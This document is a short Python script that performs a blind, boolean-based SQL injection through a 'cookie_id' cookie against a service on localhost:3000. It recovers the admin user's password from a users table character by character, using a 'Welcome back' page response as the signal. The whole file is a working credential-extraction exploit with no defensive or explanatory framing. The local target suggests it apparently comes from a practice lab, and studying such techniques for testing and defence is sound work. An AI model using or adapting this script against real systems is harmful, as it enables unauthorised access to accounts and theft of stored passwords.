import requests
import urllib.parse

def sqli_password():
    url = "http://localhost:3000/check-session"
    password_extracted = ""
    for i in range(1, 21): 
        for j in range(32, 126):  
            sqli_payload = f"' and ascii(substring((select password from users where username='admin'),{i},1))='{j}'--'"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'cookie_id': '7g.G2!xFopZMPdJ' + sqli_payload_encoded}
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome back" in r.text:
                password_extracted += chr(j)
                print(f"\rPassword so far: {password_extracted}", end='')
                break

def main():
    print("(+) Retrieving admin password...")
    sqli_password()
    print("\n(+) Done")

if __name__ == "__main__":
    main()
